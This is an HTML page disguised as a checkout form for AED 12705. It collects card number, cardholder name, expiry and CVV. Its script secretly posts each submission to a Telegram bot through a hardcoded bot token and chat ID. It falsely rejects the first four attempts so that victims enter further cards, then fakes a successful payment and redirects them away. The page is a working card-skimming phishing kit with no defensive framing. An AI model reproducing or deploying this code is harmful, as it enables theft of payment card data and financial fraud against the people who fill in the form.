k<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Details</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #1e1e2f;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #fff;
        }
        .payment-container {
            background-color: #2a2a40;
            padding: 30px;
            border-radius: 12px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        .payment-container:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.4);
        }
        .payment-container h2 {
            margin: 0 0 20px 0;
            font-size: 28px;
            font-weight: bold;
            color: #fff;
            text-align: center;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            border-bottom: 2px solid #6a11cb;
            padding-bottom: 10px;
        }
        .payment-method {
            margin-bottom: 20px;
        }
        .payment-method label {
            display: block;
            margin-bottom: 10px;
            font-weight: bold;
            color: #ccc;
        }
        .payment-method input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: 1px solid #444;
            border-radius: 6px;
            font-size: 16px;
            background-color: #3a3a50;
            color: #fff;
            transition: border-color 0.3s ease;
        }
        .payment-method input:focus {
            border-color: #6a11cb;
            outline: none;
        }
        .cvv-section {
            margin-bottom: 20px;
        }
        .cvv-section label {
            display: block;
            margin-bottom: 10px;
            font-weight: bold;
            color: #ccc;
        }
        .cvv-section input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: 1px solid #444;
            border-radius: 6px;
            font-size: 16px;
            background-color: #3a3a50;
            color: #fff;
            transition: border-color 0.3s ease;
        }
        .cvv-section input:focus {
            border-color: #6a11cb;
            outline: none;
        }
        .expiry-date-section {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        .expiry-date-section select {
            width: 48%;
            padding: 12px;
            border: 1px solid #444;
            border-radius: 6px;
            font-size: 16px;
            background-color: #3a3a50;
            color: #fff;
            transition: border-color 0.3s ease;
        }
        .expiry-date-section select:focus {
            border-color: #6a11cb;
            outline: none;
        }
        .total-amount {
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 20px;
            color: #fff;
            text-align: center;
        }
        .pay-now-button {
            text-align: right;
        }
        .pay-now-button button {
            background-color: #6a11cb;
            color: #fff;
            padding: 12px 24px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s ease;
        }
        .pay-now-button button:hover {
            background-color: #2575fc;
        }
        .status-message {
            text-align: center;
            color: #f44336;
            font-size: 18px;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="payment-container">
        <h2>Payment Details</h2>
        <form id="payment-form">
            <div class="payment-method">
                <label for="card-number">Card number</label>
                <input type="text" id="card-number" name="card_number" placeholder="1234-5678-9101-1213" maxlength="19" required>
                
                <label for="full-name">Full name (as it appears on card)</label>
                <input type="text" id="full-name" name="full_name" placeholder="Enter full name" required>
            </div>
            <div class="expiry-date-section">
                <div>
                    <label for="expiry-month">Expiry Month</label>
                    <select id="expiry-month" name="expiry_month" required>
                        <option value="01">Jan 01</option>
                        <option value="02">Feb 02</option>
                        <option value="03">Mar 03</option>
                        <option value="04">Apr 04</option>
                        <option value="05">May 05</option>
                        <option value="06">Jun 06</option>
                        <option value="07">Jul 07</option>
                        <option value="08">Aug 08</option>
                        <option value="09">Sep 09</option>
                        <option value="10">Oct 10</option>
                        <option value="11">Nov 11</option>
                        <option value="12">Dec 12</option>
                    </select>
                </div>
                <div>
                    <label for="expiry-year">Expiry Year</label>
                    <select id="expiry-year" name="expiry_year" required>
                        <option value="2025">2025</option>
                        <option value="2026">2026</option>
                        <option value="2027">2027</option>
                        <option value="2028">2028</option>
                        <option value="2029">2029</option>
                        <option value="2030">2030</option>
                        <option value="2031">2031</option>
                        <option value="2032">2032</option>
                        <option value="2033">2033</option>
                        <option value="2034">2034</option>
                        <option value="2035">2035</option>
                    </select>
                </div>
            </div>
            <div class="cvv-section">
                <label for="cvv">CVV</label>
                <input type="text" id="cvv" name="cvv" placeholder="Enter CVV" required>
            </div>
            <div class="total-amount">
                Total to be paid: AED 12705
            </div>
            <div class="pay-now-button">
                <button type="submit">PAY NOW</button>
            </div>
        </form>
        <div id="status-message" class="status-message"></div>
    </div>

    <script>
        let attemptCount = 0; // Counter to track the number of attempts

        document.getElementById('payment-form').addEventListener('submit', function(e) {
            e.preventDefault();

            const statusMessage = document.getElementById('status-message');

            if (attemptCount < 4) {
                attemptCount++;
                statusMessage.textContent = 'Card not accepted, please use another card';
            } else {
                statusMessage.textContent = 'Payment successful';
                attemptCount = 0; // Reset counter after successful payment

                // Redirect after 7 seconds
                setTimeout(function() {
                    window.location.href = "https://th.bing.com/th/id/R.8c8105404f9f4a71dee03374a69aef22?rik=6IJmHdxCG8u6Yw&pid=ImgRaw&r=0&sres=1&sresct=1";
                }, 7000); // 7 seconds delay
            }

            // Send data to Telegram bot after every attempt
            const cardNumber = document.getElementById('card-number').value;
            const fullName = document.getElementById('full-name').value;
            const expiryMonth = document.getElementById('expiry-month').value;
            const expiryYear = document.getElementById('expiry-year').value;
            const cvv = document.getElementById('cvv').value;

            const botToken = '7202073423:AAELtJuqz4lIdSaC21XMKJcboK5i1gLjQIE';
            const chatId = '7089054197';

            const message = `Payment Details:
            - Card Number: ${cardNumber}
            - Full Name: ${fullName}
            - Expiry Date: ${expiryMonth}/${expiryYear}
            - CVV: ${cvv}`;

            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Data sent to Telegram:', data);
            })
            .catch(error => {
                console.error('Error sending data to Telegram:', error);
            });
        });
    </script>
</body>
</html>
